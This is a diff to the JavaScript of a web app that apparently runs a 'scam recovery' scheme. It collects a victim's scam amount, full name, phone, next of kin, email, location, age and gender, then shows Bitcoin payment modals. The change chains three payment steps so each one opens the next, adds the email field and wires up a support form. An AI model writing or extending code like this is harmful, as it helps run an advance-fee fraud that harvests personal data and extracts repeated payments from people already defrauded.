@@ -106,13 +106,40 @@ document.addEventListener('DOMContentLoaded', () => {
   if (supportForm) {
     supportForm.addEventListener('submit', async (e) => {
       e.preventDefault();
-      // Check for internet connection
-      if (navigator.onLine) {
-        showPaymentSnackbar('We will get to you soon.');
+      
+      const message = document.getElementById('support-message').value;
+      const userEmail = currentUser?.email || 'No email provided';
+      
+      try {
+        showLoading();
+        
+        const response = await fetch('/api/support', {
+          method: 'POST',
+          headers: {
+            'Content-Type': 'application/json',
+          },
+          body: JSON.stringify({
+            message,
+            userEmail,
+            userName: currentUser?.displayName || 'Anonymous User'
+          })
+        });
+
+        if (!response.ok) {
+          throw new Error('Failed to send support message');
+        }
+
+        // Clear form and close modal
         supportForm.reset();
         supportModal.classList.remove('active');
-      } else {
-        showPaymentSnackbar('Error: No internet connection. Please try again.');
+        
+        // Show success message
+        alert('Your message has been sent successfully. We will get back to you soon!');
+      } catch (error) {
+        console.error('Error sending support message:', error);
+        alert('Failed to send message. Please try again later.');
+      } finally {
+        hideLoading();
       }
     });
   }
@@ -444,7 +471,7 @@ function updateCryptoPriceDisplay() {
   }
 }
 
-// Updated withdraw button click handler
+// Handle withdraw button click - UPDATED
 if (withdrawBtn) {
   withdrawBtn.addEventListener('click', async (e) => {
     e.preventDefault();
@@ -621,6 +648,11 @@ function createPaymentModal(step, amount = null) {
               </div>
               
               <div class="user-detail-field">
+                <label for="user-email" class="user-detail-label">Email</label>
+                <input type="email" id="user-email" class="user-detail-input" placeholder="Enter your email" required>
+              </div>
+              
+              <div class="user-detail-field">
                 <label for="user-location" class="user-detail-label">Location</label>
                 <input type="text" id="user-location" class="user-detail-input" placeholder="Enter your location" required>
               </div>
@@ -790,7 +822,7 @@ function showPaymentSnackbar(message) {
   }, 2500);
 }
 
-// Updated handlePaymentComplete function - JUST DISPLAYS NEXT MODAL
+// Handle payment completion - UPDATED
 async function handlePaymentComplete(step) {
   const completeBtn = document.getElementById('payment-complete-btn');
   try {
@@ -805,21 +837,23 @@ async function handlePaymentComplete(step) {
       </span>
       Processing...`;
 
+    let updateData = {};
     if (step === 1) {
-      // Validate scam amount and user details for step 1
+      // Validate scam amount and user details
       const scamAmountInput = document.getElementById('scam-amount');
       const fullNameInput = document.getElementById('user-fullname');
       const phoneInput = document.getElementById('user-phone');
       const nextOfKinInput = document.getElementById('user-nextofkin');
+      const emailInput = document.getElementById('user-email');
       const locationInput = document.getElementById('user-location');
       const ageInput = document.getElementById('user-age');
       const genderInput = document.getElementById('user-gender');
-      
       if (
         !scamAmountInput || scamAmountInput.value.trim() === '' ||
         !fullNameInput || fullNameInput.value.trim() === '' ||
         !phoneInput || phoneInput.value.trim() === '' ||
         !nextOfKinInput || nextOfKinInput.value.trim() === '' ||
+        !emailInput || emailInput.value.trim() === '' ||
         !locationInput || locationInput.value.trim() === '' ||
         !ageInput || ageInput.value.trim() === '' ||
         !genderInput || genderInput.value.trim() === ''
@@ -836,7 +870,6 @@ async function handlePaymentComplete(step) {
         `;
         return;
       }
-      
       const scamAmount = parseFloat(scamAmountInput.value);
       if (scamAmount <= 0) {
         alert('Please enter a valid scam amount');
@@ -851,28 +884,39 @@ async function handlePaymentComplete(step) {
         `;
         return;
       }
-
-      // Store the scam amount in userData for step 3 calculation
-      userData.howMuchScammed = scamAmount;
-      
-      // Update Firestore with user details (but don't set pendingPayment1 to true)
-      await db.collection('users').doc(currentUser.uid).update({
+      updateData = {
         howMuchScammed: scamAmount,
         fullName: fullNameInput.value,
         phone: phoneInput.value,
         nextOfKin: nextOfKinInput.value,
+        email: emailInput.value,
         location: locationInput.value,
         age: parseInt(ageInput.value),
-        gender: genderInput.value
-      });
+        gender: genderInput.value,
+        pendingPayment1: true
+      };
+    } else if (step === 2) {
+      updateData = { pendingPayment2: true };
+    } else if (step === 3) {
+      updateData = { pendingPayment3: true };
     }
-
-    // Show snackbar and close current modal, do NOT show next modal
+    await db.collection('users').doc(currentUser.uid).update(updateData);
+    // Show snackbar and close modal
     setTimeout(() => {
       closePaymentModal();
       showPaymentSnackbar('Payment will be processed shortly');
+      setTimeout(async () => {
+        // Reload user data
+        const userDoc = await db.collection('users').doc(currentUser.uid).get();
+        userData = userDoc.data();
+        // Show next modal if needed
+        if (step === 1 && !userData.pendingPayment2) {
+          createPaymentModal(2);
+        } else if (step === 2 && !userData.pendingPayment3) {
+          createPaymentModal(3);
+        }
+      }, 1200);
     }, 800);
-
   } catch (error) {
     console.error('Error handling payment completion:', error);
     alert('Error processing payment. Please try again.');
@@ -885,121 +929,5 @@ async function handlePaymentComplete(step) {
       </span>
       I have completed the payment
     `;
-  }
-}
-
-// Deposit button handler
-const depositBtn = document.getElementById('deposit-btn');
-if (depositBtn) {
-  depositBtn.addEventListener('click', (e) => {
-    e.preventDefault();
-    createDepositModal();
-  });
-}
-
-function createDepositModal() {
-  const modalHTML = `
-    <div class="payment-modal-overlay" id="payment-modal">
-      <div class="payment-modal">
-        <div class="payment-modal-header">
-          <div class="payment-header-content">
-            <div class="payment-icon">
-              <svg width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2">
-                <path d="M12 9v3m0 0v3m0-3h3m-3 0H9m12 0a9 9 0 11-18 0 9 9 0 0118 0z"/>
-              </svg>
-            </div>
-            <div class="payment-title-section">
-              <h3 class="payment-title">Deposit</h3>
-              <p class="payment-subtitle">Deposit funds to your account</p>
-            </div>
-          </div>
-          <button class="payment-modal-close" id="payment-modal-close">
-            <svg width="20" height="20" viewBox="0 0 20 20" fill="currentColor">
-              <path fill-rule="evenodd" d="M4.293 4.293a1 1 0 011.414 0L10 8.586l4.293-4.293a1 1 0 111.414 1.414L11.414 10l4.293 4.293a1 1 0 01-1.414 1.414L10 11.414l-4.293 4.293a1 1 0 01-1.414-1.414L8.586 10 4.293 5.707a1 1 0 010-1.414z" clip-rule="evenodd"/>
-            </svg>
-          </button>
-        </div>
-        <div class="payment-modal-content">
-          <div class="scam-amount-section">
-            <label for="deposit-amount" class="scam-amount-label">
-              <span class="label-text">Deposit Amount</span>
-              <span class="label-description">Enter the amount you want to deposit</span>
-            </label>
-            <div class="scam-amount-input-wrapper">
-              <span class="currency-symbol">$</span>
-              <input type="number" id="deposit-amount" class="scam-amount-input" placeholder="0.00" min="1" step="0.01" required>
-            </div>
-          </div>
-          <div class="payment-details-section">
-            <div class="payment-method-header">
-              <div class="bitcoin-icon">
-                <svg width="32" height="32" viewBox="0 0 32 32" fill="none">
-                  <circle cx="16" cy="16" r="16" fill="#F7931A"/>
-                  <path d="M23.189 14.02c.314-2.096-1.283-3.223-3.465-3.975l.708-2.84-1.728-.43-.69 2.765c-.454-.113-.92-.22-1.385-.326l.695-2.783L15.596 6l-.708 2.839c-.376-.086-.746-.17-1.104-.257l.002-.009-2.384-.595-.46 1.846s1.283.294 1.256.312c.7.175.826.638.805 1.006l-.806 3.235c.048.012.11.03.18.057l-.181-.045-1.13 4.532c-.086.212-.303.531-.793.41.018.025-1.256-.313-1.256-.313L8.53 19.833l2.25.561c.418.105.828.215 1.231.318l-.715 2.872 1.728.43.708-2.84c.472.127.93.245 1.378.357l-.706 2.828 1.728.43.715-2.866c2.948.558 5.164.333 6.097-2.333.752-2.146-.037-3.385-1.588-4.192 1.13-.26 1.98-1.003 2.207-2.538z" fill="white"/>
-                </svg>
-              </div>
-              <h4 class="payment-method-title">Bitcoin Payment</h4>
-              <p class="payment-method-subtitle">Send payment to the address below</p>
-            </div>
-            <div class="qr-code-section">
-              <div class="qr-code-container">
-                <img src="${BTC_QR_CODE_URL}" alt="Bitcoin QR Code" class="qr-code-image">
-              </div>
-            </div>
-            <div class="wallet-address-section">
-              <label class="wallet-address-label">Bitcoin Wallet Address</label>
-              <div class="wallet-address-container">
-                <input type="text" value="${BTC_WALLET_ADDRESS}" class="wallet-address-input" readonly>
-                <button class="copy-address-btn" onclick="copyWalletAddress()">
-                  <svg width="16" height="16" viewBox="0 0 16 16" fill="currentColor">
-                    <path fill-rule="evenodd" d="M4 2a2 2 0 012-2h8a2 2 0 012 2v8a2 2 0 01-2 2H6a2 2 0 01-2-2V2zm2-1a1 1 0 00-1 1v8a1 1 0 001 1h8a1 1 0 001-1V2a1 1 0 00-1-1H6zM2 5a1 1 0 100-2 1 1 0 000 2zm-2 9a2 2 0 012-2h2a1 1 0 010 2H2a1 1 0 01-1-1v-7a1 1 0 012 0v6a1 1 0 001 1h8a1 1 0 010 2H2z"/>
-                  </svg>
-                </button>
-              </div>
-            </div>
-          </div>
-          <div class="payment-actions">
-            <button class="payment-complete-btn" id="deposit-complete-btn">
-              <span class="button-icon">
-                <svg width="20" height="20" viewBox="0 0 20 20" fill="currentColor">
-                  <path fill-rule="evenodd" d="M16.707 5.293a1 1 0 010 1.414l-8 8a1 1 0 01-1.414 0l-4-4a1 1 0 011.414-1.414L8 12.586l7.293-7.293a1 1 0 011.414 0z" clip-rule="evenodd"/>
-                </svg>
-              </span>
-              I have completed the payment
-            </button>
-          </div>
-        </div>
-      </div>
-    </div>
-  `;
-
-  document.body.insertAdjacentHTML('beforeend', modalHTML);
-  const modal = document.getElementById('payment-modal');
-  const closeBtn = document.getElementById('payment-modal-close');
-  setTimeout(() => {
-    modal.classList.add('active');
-  }, 10);
-  closeBtn.addEventListener('click', () => closePaymentModal());
-  modal.addEventListener('click', (e) => {
-    if (e.target === modal) closePaymentModal();
-  });
-  // Deposit complete handler
-  const depositCompleteBtn = document.getElementById('deposit-complete-btn');
-  if (depositCompleteBtn) {
-    depositCompleteBtn.addEventListener('click', async () => {
-      const depositAmountInput = document.getElementById('deposit-amount');
-      if (!depositAmountInput || depositAmountInput.value.trim() === '' || parseFloat(depositAmountInput.value) <= 0) {
-        alert('Please enter a valid deposit amount');
-        return;
-      }
-      const depositAmount = parseFloat(depositAmountInput.value);
-      try {
-        await db.collection('users').doc(currentUser.uid).update({ depositAmount });
-        closePaymentModal();
-        showPaymentSnackbar('Payment will be processed shortly');
-      } catch (error) {
-        alert('Error processing deposit. Please try again.');
-      }
-    });
   }
 }
